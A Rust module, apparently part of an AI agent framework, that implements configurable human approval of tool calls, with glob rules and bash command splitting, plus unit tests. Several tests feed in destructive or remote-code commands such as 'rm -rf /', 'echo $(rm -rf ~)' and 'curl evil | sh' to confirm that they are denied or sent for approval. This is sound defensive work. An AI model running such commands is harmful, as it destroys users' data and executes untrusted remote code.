//! 工具调用审批策略（配置 `toolApproval`）与判定。运行时等待/事件见 `agent_core::approval`。
//!
//! 配置形状：
//! - `"never"`（默认）：不审批；`"always"`：每次工具调用都要审批；
//! - 对象 `{default, tools, bash, timeoutSecs, onTimeout}`：
//!   - `default`：`allow`（默认）| `ask` | `deny`；
//!   - `tools`：工具名或 glob（`*` 匹配任意字符，如 `mcp__*`、`mcp__github__*`）→ 动作。精确名优先，
//!     其次是字面字符最多（最具体）的 glob，同样具体时取最严格的动作；
//!   - `bash`：`{allow, ask, deny}`，对 bash 的 `command`（trim、空白折叠后）做 glob 匹配，先于 `tools.bash` / `default`：
//!     任一片段（或整条命令）命中 deny ⇒ deny；否则命中 ask ⇒ ask；否则**每个**片段都命中 allow ⇒ allow；
//!     都不满足 ⇒ 回落到 `tools.bash` / `default`。片段按 `;` `&&` `||` `|` `&` 换行 以及 `` ` `` `$(` `(` `)` 切分（不解析引号，宁可少放行）；
//!     含命令替换（`` ` `` / `$(` / `<(` / `>(`）的命令永远不会命中 allow；
//!   - `timeoutSecs`（默认 300，1..=86400）、`onTimeout`：`deny`（默认）| `allow`。
use agent_core::{ApprovalPolicy, Verdict};
use serde::{de::Error as _, Deserialize, Deserializer, Serialize, Serializer};
use serde_json::Value;
use std::collections::BTreeMap;

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Action {
    #[default]
    Allow,
    Ask,
    Deny,
}

impl Action {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Ask => "ask",
            Self::Deny => "deny",
        }
    }
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum TimeoutAction {
    Allow,
    #[default]
    Deny,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct BashRules {
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default)]
    pub ask: Vec<String>,
    #[serde(default)]
    pub deny: Vec<String>,
}

pub const DEFAULT_TIMEOUT_SECS: u64 = 300;
pub const MAX_TIMEOUT_SECS: u64 = 86_400;

fn default_timeout() -> u64 {
    DEFAULT_TIMEOUT_SECS
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct ApprovalRules {
    #[serde(default)]
    pub default: Action,
    #[serde(default)]
    pub tools: BTreeMap<String, Action>,
    #[serde(default)]
    pub bash: BashRules,
    #[serde(default = "default_timeout")]
    pub timeout_secs: u64,
    #[serde(default)]
    pub on_timeout: TimeoutAction,
}

impl Default for ApprovalRules {
    fn default() -> Self {
        Self { default: Action::Allow, tools: BTreeMap::new(), bash: BashRules::default(), timeout_secs: DEFAULT_TIMEOUT_SECS, on_timeout: TimeoutAction::Deny }
    }
}

/// 配置 `toolApproval`。
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub enum ToolApproval {
    #[default]
    Never,
    Always,
    Rules(ApprovalRules),
}

impl Serialize for ToolApproval {
    fn serialize<S: Serializer>(&self, s: S) -> Result<S::Ok, S::Error> {
        match self {
            Self::Never => s.serialize_str("never"),
            Self::Always => s.serialize_str("always"),
            Self::Rules(r) => r.serialize(s),
        }
    }
}

impl<'de> Deserialize<'de> for ToolApproval {
    fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        Self::from_value(Value::deserialize(d)?).map_err(D::Error::custom)
    }
}

fn valid_tool_pattern(p: &str) -> bool {
    !p.is_empty() && p.len() <= 128 && p.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b':' | b'*'))
}

/// 空白折叠：连续空白 ⇒ 单个空格，首尾去掉。
fn normalize(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// 把命令切成片段；第二个返回值表示含命令替换（`` ` `` / `$(` / `<(` / `>(`）。
pub fn split_command(cmd: &str) -> (Vec<String>, bool) {
    let chars: Vec<char> = cmd.chars().collect();
    let mut segments = vec![];
    let mut cur = String::new();
    let mut substitution = false;
    let mut flush = |cur: &mut String| {
        let s = normalize(cur);
        if !s.is_empty() {
            segments.push(s);
        }
        cur.clear();
    };
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        let next = chars.get(i + 1).copied();
        let prev = if i > 0 { Some(chars[i - 1]) } else { None };
        match c {
            '\n' | '\r' | ';' | '(' | ')' => flush(&mut cur),
            '|' => {
                flush(&mut cur);
                if matches!(next, Some('|' | '&')) {
                    i += 1;
                }
            }
            // `2>&1` / `>&2` / `&>file` 是重定向，不是后台/与运算
            '&' if matches!(prev, Some('>' | '<')) || next == Some('>') => cur.push(c),
            '&' => {
                flush(&mut cur);
                if next == Some('&') {
                    i += 1;
                }
            }
            '`' => {
                substitution = true;
                flush(&mut cur);
            }
            '$' | '<' | '>' if next == Some('(') => {
                substitution = true;
                flush(&mut cur);
                i += 1;
            }
            _ => cur.push(c),
        }
        i += 1;
    }
    flush(&mut cur);
    (segments, substitution)
}

fn bash_match(pattern: &str, text: &str) -> bool {
    crate::shell_env::glob(&normalize(pattern), text)
}

impl ToolApproval {
    pub fn from_value(v: Value) -> Result<Self, String> {
        let parsed = match v {
            Value::String(s) => match s.as_str() {
                "never" => Self::Never,
                "always" => Self::Always,
                other => return Err(format!("toolApproval: unknown mode '{other}' (expected \"never\", \"always\" or an object)")),
            },
            v @ Value::Object(_) => Self::Rules(serde_json::from_value(v).map_err(|e| format!("toolApproval: {e}"))?),
            _ => return Err("toolApproval must be \"never\", \"always\" or an object {default, tools, bash, timeoutSecs, onTimeout}".into()),
        };
        parsed.validate()?;
        Ok(parsed)
    }

    pub fn validate(&self) -> Result<(), String> {
        let Self::Rules(r) = self else { return Ok(()) };
        if !(1..=MAX_TIMEOUT_SECS).contains(&r.timeout_secs) {
            return Err(format!("toolApproval.timeoutSecs must be between 1 and {MAX_TIMEOUT_SECS}"));
        }
        for name in r.tools.keys() {
            if !valid_tool_pattern(name) {
                return Err(format!("toolApproval.tools: invalid tool name or pattern '{}' (allowed: A-Z a-z 0-9 _ - . : and * wildcards)", name.chars().take(64).collect::<String>()));
            }
        }
        for (field, list) in [("allow", &r.bash.allow), ("ask", &r.bash.ask), ("deny", &r.bash.deny)] {
            if list.iter().any(|p| p.trim().is_empty()) {
                return Err(format!("toolApproval.bash.{field}: patterns must not be empty"));
            }
        }
        Ok(())
    }

    /// 是否可能给出 ask / deny（否则等价于 never，不需要审批闸门）。
    pub fn is_active(&self) -> bool {
        match self {
            Self::Never => false,
            Self::Always => true,
            Self::Rules(r) => r.default != Action::Allow || r.tools.values().any(|a| *a != Action::Allow) || !r.bash.ask.is_empty() || !r.bash.deny.is_empty(),
        }
    }

    pub fn timeout_secs(&self) -> u64 {
        match self {
            Self::Rules(r) => r.timeout_secs,
            _ => DEFAULT_TIMEOUT_SECS,
        }
    }

    pub fn approve_on_timeout(&self) -> bool {
        matches!(self, Self::Rules(r) if r.on_timeout == TimeoutAction::Allow)
    }

    /// 工具级动作与命中的规则描述。
    fn tool_action(r: &ApprovalRules, tool: &str) -> (Action, Option<String>) {
        if let Some(a) = r.tools.get(tool) {
            return (*a, Some(tool.to_string()));
        }
        let best =
            r.tools.iter().filter(|(p, _)| p.contains('*') && crate::shell_env::glob(p, tool)).max_by_key(|(p, a)| (p.chars().filter(|c| *c != '*').count(), **a)).map(|(p, a)| (*a, Some(p.clone())));
        best.unwrap_or((r.default, None))
    }

    pub fn evaluate(&self, tool: &str, args: &Value) -> Verdict {
        let r = match self {
            Self::Never => return Verdict::Allow { reason: "toolApproval: never".into() },
            Self::Always => return Verdict::Ask { reason: format!("tool '{tool}' requires approval (toolApproval: always)") },
            Self::Rules(r) => r,
        };
        if tool == "bash" {
            if let Some(command) = args.get("command").and_then(Value::as_str) {
                if let Some(v) = Self::evaluate_bash(&r.bash, command) {
                    return v;
                }
            }
        }
        let (action, rule) = Self::tool_action(r, tool);
        let source = match &rule {
            Some(p) => format!("tools rule '{p}'"),
            None => format!("default: {}", action.as_str()),
        };
        match action {
            Action::Allow => Verdict::Allow { reason: source },
            Action::Ask => Verdict::Ask { reason: format!("tool '{tool}' requires approval ({source})") },
            Action::Deny => Verdict::Deny { reason: format!("tool '{tool}' is denied ({source})") },
        }
    }

    fn evaluate_bash(rules: &BashRules, command: &str) -> Option<Verdict> {
        let whole = normalize(command);
        let (segments, substitution) = split_command(command);
        let hit = |list: &[String]| list.iter().find(|p| bash_match(p, &whole) || segments.iter().any(|s| bash_match(p, s))).cloned();
        if let Some(p) = hit(&rules.deny) {
            return Some(Verdict::Deny { reason: format!("bash command matched bash.deny rule '{p}'") });
        }
        if let Some(p) = hit(&rules.ask) {
            return Some(Verdict::Ask { reason: format!("bash command matched bash.ask rule '{p}'") });
        }
        if !rules.allow.is_empty() && !substitution && !segments.is_empty() && segments.iter().all(|s| rules.allow.iter().any(|p| bash_match(p, s))) {
            return Some(Verdict::Allow { reason: "bash command matched bash.allow rules".into() });
        }
        None
    }
}

/// profile 策略 + 可选的会话策略：取最严格的判定（deny > ask > allow），因此会话只能收紧。
/// 超时取所有生效层的最小值；只有所有生效层都是 `onTimeout: allow` 时超时才放行。
#[derive(Debug, Clone, Default)]
pub struct ApprovalStack {
    layers: Vec<(&'static str, ToolApproval)>,
}

impl ApprovalStack {
    pub fn new(profile: ToolApproval, session: Option<ToolApproval>) -> Self {
        let mut layers = vec![("", profile)];
        if let Some(s) = session {
            layers.push(("session", s));
        }
        Self { layers }
    }

    pub fn is_active(&self) -> bool {
        self.layers.iter().any(|(_, l)| l.is_active())
    }

    fn active(&self) -> impl Iterator<Item = &ToolApproval> {
        self.layers.iter().map(|(_, l)| l).filter(|l| l.is_active())
    }

    pub fn timeout_secs(&self) -> u64 {
        self.active().map(ToolApproval::timeout_secs).min().unwrap_or(DEFAULT_TIMEOUT_SECS)
    }

    pub fn approve_on_timeout(&self) -> bool {
        self.active().count() > 0 && self.active().all(ToolApproval::approve_on_timeout)
    }
}

impl ApprovalPolicy for ApprovalStack {
    fn evaluate(&self, tool: &str, args: &Value) -> Verdict {
        let mut best: Option<Verdict> = None;
        for (label, layer) in &self.layers {
            let v = match layer.evaluate(tool, args) {
                v if label.is_empty() => v,
                Verdict::Allow { reason } => Verdict::Allow { reason: format!("{label}: {reason}") },
                Verdict::Ask { reason } => Verdict::Ask { reason: format!("{label}: {reason}") },
                Verdict::Deny { reason } => Verdict::Deny { reason: format!("{label}: {reason}") },
            };
            if best.as_ref().is_none_or(|b| v.rank() > b.rank()) {
                best = Some(v);
            }
        }
        best.unwrap_or(Verdict::Allow { reason: "toolApproval: never".into() })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn parse(v: Value) -> ToolApproval {
        serde_json::from_value(v).unwrap()
    }

    fn kind(v: &Verdict) -> &'static str {
        match v {
            Verdict::Allow { .. } => "allow",
            Verdict::Ask { .. } => "ask",
            Verdict::Deny { .. } => "deny",
        }
    }

    fn bash(p: &ToolApproval, cmd: &str) -> &'static str {
        kind(&p.evaluate("bash", &json!({ "command": cmd })))
    }

    #[test]
    fn never_and_always() {
        let never = parse(json!("never"));
        assert_eq!(never, ToolApproval::Never);
        assert!(!never.is_active());
        assert_eq!(kind(&never.evaluate("bash", &json!({"command": "rm -rf /"}))), "allow");
        let always = parse(json!("always"));
        assert!(always.is_active());
        assert_eq!(always.evaluate("read", &json!({})), Verdict::Ask { reason: "tool 'read' requires approval (toolApproval: always)".into() });
        assert_eq!(always.timeout_secs(), 300);
        assert!(!always.approve_on_timeout());
        assert_eq!(ToolApproval::default(), ToolApproval::Never);
        assert_eq!(serde_json::to_value(&always).unwrap(), json!("always"));
    }

    #[test]
    fn tool_map_exact_glob_and_default() {
        let p = parse(json!({
            "default": "ask",
            "tools": {"read": "allow", "ls": "allow", "write": "deny", "mcp__*": "ask", "mcp__github__*": "allow", "mcp__github__delete_*": "deny"}
        }));
        assert!(p.is_active());
        assert_eq!(p.evaluate("read", &json!({})), Verdict::Allow { reason: "tools rule 'read'".into() });
        assert_eq!(p.evaluate("write", &json!({})), Verdict::Deny { reason: "tool 'write' is denied (tools rule 'write')".into() });
        assert_eq!(p.evaluate("edit", &json!({})), Verdict::Ask { reason: "tool 'edit' requires approval (default: ask)".into() });
        // MCP 工具名 mcp__<server>__<tool>：最具体的 glob 胜出
        assert_eq!(kind(&p.evaluate("mcp__fs__read_file", &json!({}))), "ask");
        assert_eq!(p.evaluate("mcp__github__get_issue", &json!({})), Verdict::Allow { reason: "tools rule 'mcp__github__*'".into() });
        assert_eq!(kind(&p.evaluate("mcp__github__delete_repo", &json!({}))), "deny");
        // 默认 default = allow
        let p = parse(json!({"tools": {"mcp__*": "deny"}}));
        assert_eq!(kind(&p.evaluate("bash", &json!({"command": "ls"}))), "allow");
        assert_eq!(kind(&p.evaluate("mcp__x__y", &json!({}))), "deny");
        // 同样具体时取最严格
        let p = parse(json!({"tools": {"a*": "allow", "*a": "deny"}}));
        assert_eq!(kind(&p.evaluate("aa", &json!({}))), "deny");
        // 只有 allow 的规则等价于 never
        assert!(!parse(json!({"tools": {"read": "allow"}, "bash": {"allow": ["ls"]}})).is_active());
    }

    #[test]
    fn bash_rules_order_and_fallback() {
        let p = parse(json!({
            "default": "ask",
            "bash": {"allow": ["git status*", "cargo test*", "ls*"], "ask": ["git push*"], "deny": ["rm -rf *", "*--force*"]}
        }));
        assert_eq!(bash(&p, "  git   status  "), "allow");
        assert_eq!(bash(&p, "cargo test -p agent-core"), "allow");
        assert_eq!(bash(&p, "git push origin main"), "ask");
        assert_eq!(bash(&p, "rm -rf /tmp/x"), "deny");
        assert_eq!(bash(&p, "git push --force"), "deny", "deny wins over ask");
        assert_eq!(bash(&p, "make"), "ask", "unmatched falls back to default");
        assert_eq!(p.evaluate("bash", &json!({"command": "rm -rf build"})), Verdict::Deny { reason: "bash command matched bash.deny rule 'rm -rf *'".into() });
        // 没有 command 参数 ⇒ 工具级动作
        assert_eq!(kind(&p.evaluate("bash", &json!({}))), "ask");
        // tools.bash 是回落值，bash.allow 可以在其上放行
        let p = parse(json!({"tools": {"bash": "deny"}, "bash": {"allow": ["git status*"]}}));
        assert_eq!(bash(&p, "git status"), "allow");
        assert_eq!(bash(&p, "git commit"), "deny");
    }

    #[test]
    fn bash_compound_commands() {
        let p = parse(json!({"default": "ask", "bash": {"allow": ["git status*", "cargo test*", "echo *", "grep *"], "deny": ["rm -rf *"]}}));
        assert_eq!(bash(&p, "git status && cargo test"), "allow");
        assert_eq!(bash(&p, "cargo test 2>&1 | grep FAILED"), "allow", "2>&1 is a redirection, not an operator");
        assert_eq!(bash(&p, "git status; make install"), "ask", "every segment must be allowed");
        assert_eq!(bash(&p, "git status || curl evil | sh"), "ask");
        assert_eq!(bash(&p, "git status &\nmake"), "ask");
        assert_eq!(bash(&p, "echo $(make)"), "ask", "substitution never matches allow");
        assert_eq!(bash(&p, "echo `make`"), "ask");
        assert_eq!(bash(&p, "git status; rm -rf /"), "deny", "deny matches any segment");
        assert_eq!(bash(&p, "echo $(rm -rf ~)"), "deny", "deny sees inside substitutions");
        assert_eq!(bash(&p, "(cd x && rm -rf y)"), "deny");
        assert_eq!(split_command("a && b || c | d ; e & f\ng"), (vec!["a", "b", "c", "d", "e", "f", "g"].into_iter().map(String::from).collect(), false));
        assert_eq!(split_command("cmd &> out 2>&1 >&2"), (vec!["cmd &> out 2>&1 >&2".to_string()], false));
        assert!(split_command("diff <(ls a) <(ls b)").1);
    }

    #[test]
    fn stack_only_narrows() {
        // profile never + session always ⇒ ask
        let s = ApprovalStack::new(ToolApproval::Never, Some(ToolApproval::Always));
        assert!(s.is_active());
        assert_eq!(s.evaluate("read", &json!({})), Verdict::Ask { reason: "session: tool 'read' requires approval (toolApproval: always)".into() });
        // session 不能放宽 profile 的 deny/ask
        let profile = parse(json!({"tools": {"write": "deny"}, "default": "ask", "timeoutSecs": 60, "onTimeout": "allow"}));
        let s = ApprovalStack::new(profile.clone(), Some(parse(json!({"default": "allow", "tools": {"write": "allow"}, "timeoutSecs": 600, "onTimeout": "allow"}))));
        assert_eq!(kind(&s.evaluate("write", &json!({}))), "deny");
        assert_eq!(kind(&s.evaluate("edit", &json!({}))), "ask");
        // 只有 allow 的会话层不参与超时
        assert_eq!(s.timeout_secs(), 60);
        assert!(s.approve_on_timeout());
        let s = ApprovalStack::new(profile, Some(parse(json!({"default": "ask", "timeoutSecs": 30}))));
        assert_eq!(s.timeout_secs(), 30);
        assert!(!s.approve_on_timeout(), "any deny-on-timeout layer wins");
        assert!(!ApprovalStack::new(ToolApproval::Never, None).is_active());
    }

    #[test]
    fn validation_errors_are_clear() {
        let err = |v: Value| serde_json::from_value::<ToolApproval>(v).unwrap_err().to_string();
        assert_eq!(err(json!("sometimes")), "toolApproval: unknown mode 'sometimes' (expected \"never\", \"always\" or an object)");
        assert!(err(json!(true)).starts_with("toolApproval must be \"never\", \"always\" or an object"));
        assert!(err(json!({"defualt": "ask"})).contains("unknown field `defualt`"), "{}", err(json!({"defualt": "ask"})));
        assert!(err(json!({"default": "maybe"})).contains("unknown variant `maybe`"));
        assert!(err(json!({"onTimeout": "ask"})).contains("unknown variant `ask`, expected `allow` or `deny`"), "{}", err(json!({"onTimeout": "ask"})));
        assert_eq!(err(json!({"timeoutSecs": 0})), "toolApproval.timeoutSecs must be between 1 and 86400");
        assert_eq!(err(json!({"timeoutSecs": 86401})), "toolApproval.timeoutSecs must be between 1 and 86400");
        assert!(err(json!({"tools": {"bad name": "ask"}})).starts_with("toolApproval.tools: invalid tool name or pattern 'bad name'"));
        assert_eq!(err(json!({"bash": {"deny": [" "]}})), "toolApproval.bash.deny: patterns must not be empty");
        assert!(err(json!({"bash": {"allwo": []}})).contains("unknown field `allwo`"));
        let ok = parse(json!({"default": "ask", "timeoutSecs": 5, "onTimeout": "allow"}));
        assert_eq!(ok.timeout_secs(), 5);
        assert!(ok.approve_on_timeout());
        assert_eq!(serde_json::to_value(&ok).unwrap()["onTimeout"], "allow");
    }
}
